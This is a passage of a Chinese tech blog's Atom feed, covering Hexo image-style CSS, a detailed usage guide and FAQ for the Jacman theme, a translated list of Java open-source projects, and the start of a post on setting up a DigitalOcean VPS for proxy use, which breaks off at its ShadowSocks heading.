<p>有网友抱怨 Jacman 的图片只能居左，他喜欢让图片居中却不知道该怎么做。为此，我也创建了一个图片样式叫<code>img-center</code>，所需的代码很短。</p>
<figure class="highlight css"><figcaption><span>/themes/jacman/source/css/_partial/article.styl</span></figcaption><table><tr><td class="gutter"><pre>1
2
3
</pre></td><td class="code"><pre><span class="class">.img-center</span>
  <span class="tag">display</span>: <span class="tag">block</span> ;
  <span class="tag">margin</span>: <span class="tag">auto</span>;
</pre></td></tr></table></figure>   

<h2 id="阴影图片">阴影图片</h2>
<p>有时候添加的图片可能会与文章背景混淆，使得读者看不清到底哪部分是图片哪部分是文章。使用<code>img-shadow</code>为图片添加边角阴影可以更加凸显图片的位置，也能更美观。</p>
<figure class="highlight css"><figcaption><span>/themes/jacman/source/css/_partial/article.styl</span></figcaption><table><tr><td class="gutter"><pre>1
2
</pre></td><td class="code"><pre><span class="class">.img-shadow</span>
  <span class="tag">box-shadow</span>: 0 0 2<span class="tag">px</span> 3<span class="tag">px</span> <span class="id">#ddd</span>;
</pre></td></tr></table></figure>   

<p>使用HTML语法插入图片</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>&lt;img src=<span class="string">"http://ww1.sinaimg.cn/large/81b78497jw1enhkcat9mqj20go06g0sy.jpg"</span> <span class="keyword">class</span>=<span class="string">"img-shadow"</span> /&gt;
</pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/81b78497jw1enhkcat9mqj20go06g0sy.jpg" class="img-shadow"></p>
<h2 id="画廊图片">画廊图片</h2>
<p>Hexo 中提供了一种文章类别叫<code>photo</code>，Jacman 也为这种文章设计了图片浏览方式。具体效果可以看这篇 <a href="http://wuchong.me/jacman/gallery/" target="_blank" rel="external">Demo</a> 。<code>photo</code>类文章的写法可以看 <a href="https://raw.githubusercontent.com/wuchong/jacman/site/source/_posts/gallery.md" target="_blank" rel="external">Demo Sample</a>。</p>
<p><img src="http://ww3.sinaimg.cn/large/81b78497jw1en8cj4r4bij20sl0krn4x.jpg" alt="photo文章效果图"></p>
<h2 id="图片备注">图片备注</h2>
<p>Jacman 中可以方便地为图片提供备注。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>![<span class="link_label">添加你的备注</span>](<span class="link_url">http://ww1.sinaimg.cn/mw690/81b78497jw1emfgts2pt4j21hc0u0k1c.jpg</span>)
</pre></td></tr></table></figure>

<p>效果就如下图，在图片左下方会显示关于图片的描述。</p>
<p><img src="http://ww1.sinaimg.cn/mw690/81b78497jw1emfgts2pt4j21hc0u0k1c.jpg" alt="添加你的备注"></p>
<p>OK，就这么多了，希望大家喜欢。如果嫌折腾麻烦，欢迎使用最新版的 <a href="https://github.com/wuchong/jacman" target="_blank" rel="external">Jacman</a>，可以直接使用以上定义的样式！</p>
<p><em>有任何关于Hexo的问题，欢迎来 <a href="https://coderq.com/c/ji-zhu/hexo" target="_blank" rel="external">Hexo 中文社区</a> 咨询。</em></p>
]]></content>
    <summary type="html"><![CDATA[<p><img src="http://ww4.sinaimg.cn/large/81b78497jw1en8b95t5kmj203j00u743.jpg" class="img-logo"></p>
<p>为一篇博客添加相关的图片可以快速吸引读者的目光，也能帮助读者理解文章概要，尤其是在写技术博客或是某些很复杂的东西时。</p>
<p>然而，Hexo 主题一般只提供一种默认的图片样式，包括 Jacman。所以，我为 Jacman 实现了几种常见的图片样式。这里我会展示这几种图片样式以及其实现方法。</p>
]]></summary>
    
      <category term="Hexo" scheme="http://wuchong.me/tags/Hexo/"/>
    
      <category term="Jacman" scheme="http://wuchong.me/tags/Jacman/"/>
    
      <category term="Hexo" scheme="http://wuchong.me/categories/Hexo/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[如何使用 Jacman 主题]]></title>
    <link href="http://wuchong.me/blog/2014/11/20/how-to-use-jacman/"/>
    <id>http://wuchong.me/blog/2014/11/20/how-to-use-jacman/</id>
    <published>2014-11-20T01:58:17.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<h2 id="主题介绍">主题介绍</h2>
<p><a href="https://github.com/wuchong/jacman" target="_blank" rel="external">Jacman</a> 是一款扁平化，有着响应式设计的 <a href="http://http://hexo.io/" target="_blank" rel="external">Hexo</a> 主题。本站正式使用了 Jacman 主题。Jacman 基于 <a href="https://github.com/A-limon/pacman" target="_blank" rel="external">Pacman</a> 主题修改而来，目前已有很多特性与原主题不同。你可以前往 <a href="http://wuchong.me" target="_blank" rel="external">本站</a> 和 <a href="http://wuchong.me/jacman" target="_blank" rel="external">Demo</a> 预览更多关于本主题的更多效果。如果你有任何问题或意见欢迎到 GitHub 发表 <a href="https://github.com/wuchong/jacman/issues" target="_blank" rel="external">issue</a>。</p>
<p>距离当初我把 Jacman 开源至今已有半年零一周了，在这半年里也一直保持着对 Jacman 的更新。看到很多人用这款主题，fork&amp;star 数也越来越好看，我也更有动力继续完善 Jacman。Jacman 自然还有很多改进空间，首先是文档问题，有许多人通过博客、微博、QQ 询问我有关主题的问题，我也意识到之前写的帮助手册可读性太差。正好趁着这次 Jacman 大更新，写篇更详尽、readable 的手册。</p>
<h2 id="安装指南">安装指南</h2>
<h3 id="安装">安装</h3>
<p>在博客根目录下执行如下命令。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre><span class="variable">$ </span>git clone <span class="symbol">https:</span>/<span class="regexp">/github.com/wuchong</span><span class="regexp">/jacman.git themes/jacman</span>
</pre></td></tr></table></figure><br>Jacman 需要安装 Hexo 2.7 及以上版本，请先升级您的 Hexo 程序，再启用此主题。<br><br>###启用<br><br>修改你的博客根目录下的<code>_config.yml</code>配置文件中的<code>theme</code>属性，将其设置为<code>jacman</code>。同时建议设置<code>stylus</code>属性中的<code>compress</code>值为true，会自动压缩 CSS 文件，hexo默认配置中不包含这一项，建议开启。如下。<br><figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
</pre></td><td class="code"><pre>theme: jacman
stylus:
  <span class="built_in">compress</span>: <span class="constant">true</span>
</pre></td></tr></table></figure>

<h3 id="更新">更新</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
</pre></td><td class="code"><pre><span class="built_in">cd</span> themes/jacman
git pull origin master
</pre></td></tr></table></figure><br>请先备份您主题目录下的 <code>_config.yml</code> 文件后再升级。<br><br><a id="more"></a><br>##配置指南<br><br>Jacman 主题提供了丰富的配置属性，可以实现您对主题的自定义。配置文件<code>_config.yml</code>位于主题根目录下。本次更新对配置文件进行了较大调整，如您之前就使用了 Jacman，也需要您根据以下指南进行相应的修改。<br><br><figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
</pre></td><td class="code"><pre><span class="comment">##### 菜单</span>
menu:
  主页: /
  归档: /archives
  关于: /about

<span class="comment">#### 控件</span>
widgets: 
- category
- tag
- links
- rss

<span class="comment">#### RSS </span>
rss: /atom.xml 

<span class="comment">#### 图片相关</span>
imglogo:
  enable: <span class="keyword">true</span>               <span class="comment">## 是否显示网站 logo</span>
  src: img/logo.png        
favicon: img/favicon.ico     <span class="comment">## 网站图标    </span>
apple_icon: img/jacman.jpg   <span class="comment">## 苹果设备上的图标，背景不要透明</span>
author_img: img/author.jpg   <span class="comment">## 网站底部的博主头像</span>

<span class="comment">#### 首页相关</span>
index:
  expand: <span class="keyword">true</span>              <span class="comment">## 首页文章是否展开。默认为展开式，显示 Read More。</span>
  excerpt_link: Read More    
  
<span class="comment">#### 作者信息</span>
author:
  intro_line1:  <span class="string">"Hello ,I'm Larry Page in Google."</span>    <span class="comment">## 网站底部的个人介绍</span>
  intro_line2:  <span class="string">"This is my blog,believe it or not."</span>  
  weibo_verifier:  <span class="comment">## 微博秀的验证码</span>
  tsina:           <span class="comment">## 用于微博秀和微博分享</span>
  weibo:           <span class="comment">## 用于显示网站底部社交按钮，下同</span>
  douban:         
  zhihu:  
  email:     
  twitter:   
  github:     
  facebook: 
  linkedin:   
  google_plus:   
  stackoverflow:  


<span class="comment">#### 目录</span>
toc:
  article: <span class="keyword">true</span>   <span class="comment">## 是否在文章中显示目录</span>
  aside: <span class="keyword">true</span>     <span class="comment">## 是否在侧边栏显示目录</span>

<span class="comment">#### 友情链接</span>
links:
  Jark's Blog: http://wuchong.me
  Hexo: http://hexo.io
  
<span class="comment">#### 评论</span>
duoshuo_shortname: 
disqus_shortname:  

<span class="comment">#### 分享按钮</span>
jiathis:
  enable: <span class="keyword">false</span>   <span class="comment">## 默认使用主题内建分享</span>
  id:    
  tsina: 
  
<span class="comment">#### 网站统计</span>
google_analytics:
  enable: <span class="keyword">false</span>
  id:            <span class="comment">## google analytics ID.</span>
  site:          <span class="comment">## 网站地址.</span>
baidu_tongji:
  enable: <span class="keyword">false</span>
  sitecode:      <span class="comment">## 百度统计站点特征码</span>
cnzz_tongji:
  enable: <span class="keyword">false</span>
  siteid:        <span class="comment">## CNZZ统计站点ID</span>

<span class="comment">#### 杂项</span>
ShowCustomFont: <span class="keyword">true</span>  
fancybox: <span class="keyword">true</span>        
totop: <span class="keyword">true</span>           

<span class="comment">#### 自定义搜索</span>
google_cse: 
  enable: <span class="keyword">false</span>
  cx:  
baidu_search:    
  enable: <span class="keyword">false</span>
  id:   
  site: http://zhannei.baidu.com/cse/search
</pre></td></tr></table></figure>

<h3 id="属性功能">属性功能</h3>
<ul>
<li><strong>菜单 menu</strong><br>默认没有启用 <code>/tags</code> 和 <code>/categories</code>页面，如果需要启用请在博客目录下的<code>source</code>文件夹中分别建立<code>tags</code> 和 <code>categories</code>文件夹每个文件夹中分别包含一个<code>index.md</code>文件。内容为：</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
</pre></td><td class="code"><pre>layout: tags (或categories)
<span class="header">title: tags (或categories)
---</span>
</pre></td></tr></table></figure>


<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为主题中已经内置了这两个页面的模板，所以他们会被正确的解析出来。</p>
<ul>
<li><p><strong>控件 widgets</strong><br>提供了7种小工具。包括标签、标签云、分类、归档、RSS、友情链接、微博秀。</p>
<p><strong>友情链接</strong>：友情链接的网址添加可以在<code>links</code>属性下添加。</p>
<p><strong>微博秀</strong>：需要注意的是，如果要启用微博秀，您必须填上<code>author</code>属性下<code>tsina</code>和<code>weibo_verifier</code>的值，前者是您微博ID，后者是您微博秀的验证码，访问 <a href="http://app.weibo.com/tool/weiboshow" target="_blank" rel="external">http://app.weibo.com/tool/weiboshow</a> 在如下图位置，可以获得您的 verifier，如：我的是<code>b3593ceb</code>。<br><img src="http://ww1.sinaimg.cn/large/81b78497jw1emegd6b0ytj209204pweu.jpg" alt=""></p>
</li>
<li><p><strong>图片相关 Image</strong><br>本主题可以设置网站相关图片，例如网站图标（<code>favicon</code>）、网站logo（<code>imglogo</code>）、作者头像（<code>author_img</code>）。建议启用网站logo，格式建议为<code>.svg</code>或<code>.png</code>格式。同时建议提供配套的 favicon 以及在苹果设备上的图标<code>apple_icon</code>（背景不要透明）。</p>
</li>
<li><p><strong>首页显示模式 Index</strong><br>目前首页的显示模式支持两种，一种是原先的卡片式（前往 <a href="http://wuchong.me/jacman" target="_blank" rel="external">Demo</a> 预览），另一种是类似官方主题的文章展开式（<a href="http://wuchong.me" target="_blank" rel="external">本站</a>即采用的这种）。两者各有优劣，前者首页加载速度更快，后者文章内容更能吸引读者。主题默认采用后一种展开式，如需开启第一种卡片式，请设置<code>index</code>属性下的<code>expand: false</code>。</p>
<p>卡片式的文章摘要是截取文章内容的前140个字，也可以自己总结<code>description</code>并将其放在开头的<code>front-matter</code>中。展开式的文章摘要就是使用<code>&lt;!-- more --&gt;</code>截取了。</p>
</li>
<li><p><strong>作者信息 author</strong><br>作者信息，建议尽量填写完整。其中<code>tsina</code>是你的新浪微博ID，不同于用户名或微博主页地址。启用这个属性后，其他用户在微博上分享你文章的同时会自动@你。同时它和<code>weibo_verifier</code>一起作用生成微博秀。<code>intro_line1</code>和<code>intro_line2</code>是网站底部的个人介绍。<code>weibo</code>、<code>twitter</code>、<code>facebook</code>等是用来显示网站右下角的社交按钮的，如下图所示。<br><img src="http://ww4.sinaimg.cn/large/81b78497jw1emgscr3575j2078050jrc.jpg" alt=""></p>
</li>
<li><p><strong>目录 toc</strong><br>是否启用在文章中或侧边栏中的目录功能。二者可以都为<code>true</code>或都为<code>false</code>。同时，如果你希望在特定的某一篇文章中关闭目录功能你可以在文章文件开头中的<code>front-matter</code>中加上一行<code>toc: false</code>。如果希望在某一篇文章中关闭目录自动编号功能你可以在文章文件开头的<code>front-matter</code>中加上一行<code>list_number: false</code>。另外 hexo 2.5.2 开始支持中文目录，想获得更好的体验请升级你的 Hexo 版本。</p>
</li>
<li><p><strong>评论 comments</strong><br>填写<code>duoshuo_shortname</code><a href="http://duoshuo.com/" target="_blank" rel="external">多说</a>的用户名，启用多说评论系统。在大陆地区更好用的评论系统。</p>
<p>填写<code>disqus_shortname</code><a href="http://disqus.com/" target="_blank" rel="external">disqus</a> 的用户名，启用 disqus 评论系统。国际上更广泛使用的评论系统。设置博客根目录下的<code>_config.yml</code>文件中的<code>disqus_shortname</code>同样也能开启该功能。</p>
</li>
<li><p><strong>加网分享 jiathis</strong><br><a href="http://www.jiathis.com/" target="_blank" rel="external">加网</a>分享系统。默认关闭，因为主题已经内置了原生的分享功能。</p>
</li>
<li><p><strong>网站统计 Analytics</strong><br><code>google_analytics</code>：Google Analytics追踪代码。请注意：Google Analytics已经升级到了Universal Analytics。请先前往后台升级你的Google Analytics版本后再启用追踪代码，更多信息请<a href="https://developers.google.com/analytics/devguides/collection/upgrade/?hl=zh_CN" target="_blank" rel="external">点击这里</a>了解。</p>
<p><code>baidu_tongji</code>：百度统计功能。需要填写站点特征码<code>sitecode</code>，在<a href="http://tongji.baidu.com/web/welcome/login" target="_blank" rel="external">官网</a>注册并配置站点后，获取特征码。特征码可以在「网站中心」-&gt; 「代码获取」中查看，如下图所示的<code>e6d1f421bbc9962127a50488f9ed37d1</code>，注意去掉前面的<code>3F</code>。<br><img src="http://ww4.sinaimg.cn/large/81b78497jw1emf4v6qf91j20kf07sq8v.jpg" alt=""></p>
<p><code>cnzz_tongji</code>：站长统计功能。需要填写站点ID<code>siteid</code>，同理在<a href="http://www.cnzz.com" target="_blank" rel="external">站长官网</a>注册并配置站点后获得。</p>
</li>
<li><p><strong>数学公式 mathjax</strong><br>主题支持写 LaTex 数学公式。只需要在文章文件开头的<code>front-matter</code>中，加上一行<code>mathjax: true</code>，即可在文中写 LaTex 公式。</p>
</li>
<li><p><strong>图片浏览 fancybox</strong><br>默认关闭，如果你使用 Hexo 经常发表 Gallery 类型的文章，那么请设置为<code>true</code>。</p>
</li>
<li><p><strong>返回顶部 totop</strong><br>右下角<code>返回顶部</code>按钮，默认开启。</p>
</li>
<li><p><strong>自定义字体 ShowCustomFont</strong><br>是否启用自定义字体，默认开启，主要用于显示网站底部的字体。如果你有一定前端基础可以修改 font.styl 替换为你喜欢的字体。</p>
</li>
<li><p><strong>自定义搜索 Search</strong><br><code>baidu_search</code>：如果开启百度站内搜索需要登录 <a href="http://zn.baidu.com/" target="_blank" rel="external">百度站内搜索</a>，配置好你的站点，并开启站内搜索获取搜索ID，另外<code>site</code>属性可以填默认值，也可以填自己做了CNAME的二级域名，更详细的可以阅读<a href="http://gengbiao.me/hexo/hexo%E6%B7%BB%E5%8A%A0%E7%99%BE%E5%BA%A6%E7%AB%99%E5%86%85%E6%90%9C%E7%B4%A2/" target="_blank" rel="external">这篇博客</a>了解。</p>
<p><code>google_cse</code>：如果开启谷歌自定义搜索需要先登录 <a href="https://www.google.com/cse/" target="_blank" rel="external">Google CSE</a>，配置好你的站点，并获得此自定义搜索的ID。此外你需要在博客目录下的<code>source</code>文件夹中建立<code>search</code>文件夹并包含一个<code>index.md</code>文件。内容为：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
</pre></td><td class="code"><pre>layout: search
<span class="header">title: search
---</span>
</pre></td></tr></table></figure>





</li>
</ul>
<h2 id="常见问题">常见问题</h2>
<ul>
<li><p><strong>Q：图片默认都是居左的，我怎么设置能让图片居中呢？</strong></p>
<blockquote>
<p>使用 <code>&lt;img src=&quot;&quot; style=&quot;display:block;margin:auto&quot;/&gt;</code>的HTML标签。</p>
</blockquote>
</li>
<li><p><strong>Q：如何建立一篇图片类文章（Gallery Post）？</strong></p>
<blockquote>
<p>使用<code>hexo new photo &quot;your titile&quot;</code>建立图片类文章，或者直接新建一个 Markdown 文件，将其<code>front-matter</code>修改为如下，即可看到主题为图片类文章提供的样式，<a href="http://wuchong.me/jacman/gallery" target="_blank" rel="external">Demo</a>。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
</pre></td><td class="code"><pre><span class="bullet">---
</span>layout: photo
title: Gallery Post
photos:
<span class="bullet">- </span>http://i.minus.com/ibobbTlfxZgITW.jpg
<span class="header">- http://i.minus.com/iedpg90Y0exFS.jpg
---</span>
</pre></td></tr></table></figure>
</blockquote>
</li>
<li><p><strong>Q：我在配置文件中给某一项设置了值，但为什么总是看不到效果啊？</strong></p>
<blockquote>
<p><code>_config.yml</code>文件中的每个属性值前面必须留一个空格，建议在 Sublime/Notepad++ 中开启显示所有空格模式。另每篇文章的 <code>front-matter</code> 也要注意这个问题。</p>
</blockquote>
</li>
<li><p><strong>Q：如何建立自我介绍页面（About 页面）？</strong></p>
<blockquote>
<p>首先在主目录找到<code>_config.yml</code>，找到url添加<code>about_dir: about</code>到这个板块。然后在<code>/source</code>里面建立about文件夹。在about文件夹里建立index.md。编辑index.md就和发布其他的文章一样，格式都一样。</p>
</blockquote>
</li>
<li><p><strong>Q：怎么提意见和建议？</strong></p>
<blockquote>
<p>主题还在不断完善中，欢迎 <a href="https://github.com/wuchong/jacman/issues" target="_blank" rel="external">open issue</a> 来提建议，参与讨论。</p>
</blockquote>
</li>
<li><p><strong>Q：楼主我不喜欢你的配色，怎么换主题的颜色呢？</strong></p>
<blockquote>
<p>包括颜色在内的很多变量都在<code>jacman/source/css/_base/variable.styl</code>文件中，可以修改成你喜欢的。</p>
</blockquote>
</li>
<li><p><strong>Q：英语更能突显我的逼格，怎么换成英语？</strong></p>
<blockquote>
<p>配置你的博客根目录下的<code>_config.yml</code>，去掉<code>language: zh-CN</code>。</p>
</blockquote>
</li>
<li><p><strong>Q：为什么我修改了配置文件/发表了博文，解析出来的却是乱码呢？ </strong></p>
<blockquote>
<p>请将你的配置文件/markdown文件保存成 <code>UTF-8</code> 格式。</p>
</blockquote>
</li>
<li><p><strong>Q：为什么开启了微博秀后，显示是空白的，没有内容展示？ </strong></p>
<blockquote>
<p>每次修改参数都会这样，需要多刷新几次或者上传到服务器上就好了。</p>
</blockquote>
</li>
<li><p><strong>Q：博主 Jacman Demo 站点中文章的 md 源文件在哪能看到呢？ </strong></p>
<blockquote>
<p>我将 Demo 站点所有源文件放在了 Jacman 的 <a href="https://github.com/wuchong/jacman/tree/site" target="_blank" rel="external">site</a> 分支下。</p>
</blockquote>
</li>
</ul>
]]></content>
    <summary type="html"><![CDATA[<h2 id="主题介绍">主题介绍</h2>
<p><a href="https://github.com/wuchong/jacman" target="_blank" rel="external">Jacman</a> 是一款扁平化，有着响应式设计的 <a href="http://http://hexo.io/" target="_blank" rel="external">Hexo</a> 主题。本站正式使用了 Jacman 主题。Jacman 基于 <a href="https://github.com/A-limon/pacman" target="_blank" rel="external">Pacman</a> 主题修改而来，目前已有很多特性与原主题不同。你可以前往 <a href="http://wuchong.me" target="_blank" rel="external">本站</a> 和 <a href="http://wuchong.me/jacman" target="_blank" rel="external">Demo</a> 预览更多关于本主题的更多效果。如果你有任何问题或意见欢迎到 GitHub 发表 <a href="https://github.com/wuchong/jacman/issues" target="_blank" rel="external">issue</a>。</p>
<p>距离当初我把 Jacman 开源至今已有半年零一周了，在这半年里也一直保持着对 Jacman 的更新。看到很多人用这款主题，fork&amp;star 数也越来越好看，我也更有动力继续完善 Jacman。Jacman 自然还有很多改进空间，首先是文档问题，有许多人通过博客、微博、QQ 询问我有关主题的问题，我也意识到之前写的帮助手册可读性太差。正好趁着这次 Jacman 大更新，写篇更详尽、readable 的手册。</p>
<h2 id="安装指南">安装指南</h2>
<h3 id="安装">安装</h3>
<p>在博客根目录下执行如下命令。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre><span class="variable">$ </span>git clone <span class="symbol">https:</span>/<span class="regexp">/github.com/wuchong</span><span class="regexp">/jacman.git themes/jacman</span>
</pre></td></tr></table></figure><br>Jacman 需要安装 Hexo 2.7 及以上版本，请先升级您的 Hexo 程序，再启用此主题。<br><br>###启用<br><br>修改你的博客根目录下的<code>_config.yml</code>配置文件中的<code>theme</code>属性，将其设置为<code>jacman</code>。同时建议设置<code>stylus</code>属性中的<code>compress</code>值为true，会自动压缩 CSS 文件，hexo默认配置中不包含这一项，建议开启。如下。<br><figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
</pre></td><td class="code"><pre>theme: jacman
stylus:
  <span class="built_in">compress</span>: <span class="constant">true</span>
</pre></td></tr></table></figure>

<h3 id="更新">更新</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
</pre></td><td class="code"><pre><span class="built_in">cd</span> themes/jacman
git pull origin master
</pre></td></tr></table></figure><br>请先备份您主题目录下的 <code>_config.yml</code> 文件后再升级。<br><br>]]></summary>
    
      <category term="Hexo" scheme="http://wuchong.me/tags/Hexo/"/>
    
      <category term="Jacman" scheme="http://wuchong.me/tags/Jacman/"/>
    
      <category term="Hexo" scheme="http://wuchong.me/categories/Hexo/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[【译】10个你能参与并学习的Java开源项目]]></title>
    <link href="http://wuchong.me/blog/2014/10/31/10-interesting-java-projects-you-can-contribute-and-learn/"/>
    <id>http://wuchong.me/blog/2014/10/31/10-interesting-java-projects-you-can-contribute-and-learn/</id>
    <published>2014-10-31T15:09:18.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p>【本文翻译自 Javapapers ,原文链接：<a href="http://javapapers.com/java/10-interesting-java-projects-you-can-contribute-and-learn/" target="_blank" rel="external">http://javapapers.com/java/10-interesting-java-projects-you-can-contribute-and-learn/</a>】</p>
<p>如果你正在寻找有趣的 Java 项目去参与和贡献，那么请继续阅读这篇文章。这篇博文是 Java 画廊（Java Gallery）中的一部分，在Java画廊栏目下我介绍了一些有趣的Java项目给我们的读者。成为 Java 开发团队中的一员并编写大量代码是一件很棒的事情。</p>
<p>在学校里我们也许没有机会接触到真正的开发环境。在企业里我们可能做不了最喜欢的项目。在这种情况下，让我们加入可以带给我们欢乐和兴趣的开源项目吧。</p>
<p><img src="http://ww1.sinaimg.cn/mw690/81b78497jw1eluqwemss2j20go0bpgo8.jpg" alt=""><br><a id="more"></a></p>
<p>有很多备受关注的初创开源项目，下面列出十个项目是我觉得非常有趣的，涉及到的学习范围也很广。其中有些还在早期阶段，这对我们来说更好。看一看这些项目，选择一个你喜欢的，然后给它的领导者发一封邮件并参加到开发中去。</p>
<ol>
<li><a href="https://github.com/codeka/wwmmo" target="_blank" rel="external">War Worlds</a> – 基于策略的游戏 – Java 服务端和 Android 客户端。</li>
<li><a href="http://www.openworm.org/" target="_blank" rel="external">OpenWorm</a> – 运行于浏览器中的小线虫的神经力学模型，其模拟后端都是用 Java 写的。</li>
<li><a href="https://github.com/thatJavaNerd/JRAW" target="_blank" rel="external">JRAW</a> – Reddit API 的 Java 包装。</li>
<li><a href="https://github.com/timmolter/XChart" target="_blank" rel="external">XChart</a> – 用于绘制数据的超轻量 Java 库。</li>
<li><a href="http://libgdx.badlogicgames.com/" target="_blank" rel="external">libgdx</a> – 用于创建游戏的开源框架。</li>
<li><a href="https://github.com/justinmeister/PongWithLibgdx" target="_blank" rel="external">Particle Pong</a> – 开源的乒乓类游戏。</li>
<li><a href="https://github.com/bitcoinj/bitcoinj" target="_blank" rel="external">bitcoinj</a> – Java 实现的比特币协议。</li>
<li><a href="https://github.com/dustedrob/JStrava" target="_blank" rel="external">JStrava</a> – Strava API 的 Java 包装。</li>
<li><a href="https://github.com/Progether/JAdventure" target="_blank" rel="external">JAdventure</a> – 基于 Java 的文字冒险游戏。</li>
<li><a href="https://github.com/Codeusa/aurous-app" target="_blank" rel="external">Aurous</a> – 能方便地从 Youtube 和其他来源的流建立庞大的播放列表和视频转换。</li>
</ol>
<p>享受编程和学习的快乐吧！</p>
<p>————译文完————</p>
<p>很久以前我在知乎上问过一个问题：<a href="http://www.zhihu.com/question/22263074" target="_blank" rel="external">有哪些适大学生参与的Java开源项目？</a>，也确实收到了很多好回复。也下了 JUnit 源码看了一部分，不过 JUnit 毕竟是很成熟的项目了，从中学习软件设计的艺术是不错，但是想参与进去还是比较困难。所以 Javapapers 推荐的这几个项目很不错，代码量都很短，且都起于初步阶段，有兴趣参与的同学可以关注下。目前我比较感兴趣的是 bitcoinj 项目。</p>
<p>-EOF-</p>
]]></content>
    <summary type="html"><![CDATA[<p>【本文翻译自 Javapapers ,原文链接：<a href="http://javapapers.com/java/10-interesting-java-projects-you-can-contribute-and-learn/" target="_blank" rel="external">http://javapapers.com/java/10-interesting-java-projects-you-can-contribute-and-learn/</a>】</p>
<p>如果你正在寻找有趣的 Java 项目去参与和贡献，那么请继续阅读这篇文章。这篇博文是 Java 画廊（Java Gallery）中的一部分，在Java画廊栏目下我介绍了一些有趣的Java项目给我们的读者。成为 Java 开发团队中的一员并编写大量代码是一件很棒的事情。</p>
<p>在学校里我们也许没有机会接触到真正的开发环境。在企业里我们可能做不了最喜欢的项目。在这种情况下，让我们加入可以带给我们欢乐和兴趣的开源项目吧。</p>
<p><img src="http://ww1.sinaimg.cn/mw690/81b78497jw1eluqwemss2j20go0bpgo8.jpg" alt=""><br>]]></summary>
    
      <category term="Java" scheme="http://wuchong.me/tags/Java/"/>
    
      <category term="开源项目" scheme="http://wuchong.me/tags/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/"/>
    
      <category term="杂项资源" scheme="http://wuchong.me/categories/%E6%9D%82%E9%A1%B9%E8%B5%84%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[DigitalOcean VPS 翻墙体验]]></title>
    <link href="http://wuchong.me/blog/2014/10/17/digitalocean-vps-experience/"/>
    <id>http://wuchong.me/blog/2014/10/17/digitalocean-vps-experience/</id>
    <published>2014-10-17T04:31:18.000Z</published>
    <updated>2014-12-22T16:18:37.000Z</updated>
    <content type="html"><![CDATA[<p>今天 <a href="https://www.glgoo.com/" target="_blank" rel="external">glgoo</a> 暂停服务了，赖以生存的 Google 曲线救国方案没了，GoAgent 又太慢，遂想折腾个 VPS 搭个代理解决科学上网的燃眉之急。</p>
<p><img src="http://ww2.sinaimg.cn/large/81b78497jw1eldy44qjgcj20hu06b0u4.jpg" alt=""></p>
<p><a href="https://www.digitalocean.com/?refcode=54668030e22a" target="_blank" rel="external">DigitalOcean</a> 作为一个 VPS 提供商新秀，以其高性价比的优势一直与高富帅的老大哥 Linode 争夺市场。最近更是在 GitHub 针对高校学生的优惠活动「<a href="https://education.github.com/pack/" target="_blank" rel="external">GitHub Student Developer Pack</a>」中推出免费 $100 的优惠服务，如果以最便宜的 $5/月 计算，可以用小两年了。对于长这么大还没玩过VPS的孩子来说，这诱惑太大了。用VPS来翻墙当然有点大材小用了，更多的是想在VPS架一些自己的网站（非博客）、跑些脚本、学点东西。<br><a id="more"></a></p>
<p>但是对于普通学生来说要拿到这100刀还是比较麻烦的。首先，你得有个 GtiHub 账号，并且验证了你的 edu 邮箱（之前笔者在 GitHub 推出学生免费私人仓库时已经验证过了，再次感谢GitHub）。然后点击<a href="https://education.github.com/pack/" target="_blank" rel="external">GitHub Student Developer Pack</a> 活动页面中「Get your pack」按钮，就可以看到合作产品的优惠活动了，这里包括了来自 NameCheap 的免费 .ME 域名，再次推荐。</p>
<p><img src="http://ww1.sinaimg.cn/large/81b78497jw1eleh03z0fij20n006g3za.jpg" alt=""></p>
<p>通过上图的链接和邀请码注册后，就可看到100刀了，但是还需要绑定个人信用卡或者使用 Paypal 支付5刀才能激活。前者可以用财付通的<a href="https://www.tenpay.com/v2/account/interna/index.shtml" target="_blank" rel="external">运通虚拟国际卡</a>，但是目前已经不开放申请了。所以就用Paypal支付5刀吧。Paypal的激活就此略过。这之后就顺利的拿到 $105 了。</p>
<h2 id="第一个VPS">第一个VPS</h2>
<p>接着就能快速创建VPS了，选择 $5/月的足矣，机房最好选在旧金山，DigitalOcean 美国西海岸机房速度还是非常优秀的，比纽约的要好，千万不能选新加坡，因为貌似还没有国内专线所以速度不敢恭维。如果已经创建了你的 Droplet 又想换机房，可以参考<a href="http://www.laozuo.org/3907.html" target="_blank" rel="external">这篇博客</a>。完成后便会收到含有主机 IP、登陆账户、密码的邮件。</p>
<p>在 Mac/Linux 上可以直接在终端 ssh 到 VPS。Windows 的话我使用的 <a href="http://www.putty.org/" target="_blank" rel="external">PuTTY</a>。接着你就可以操控你的 VPS 了。 </p>
<h2 id="ShadowSocks_翻墙">ShadowSocks 翻墙</h2>
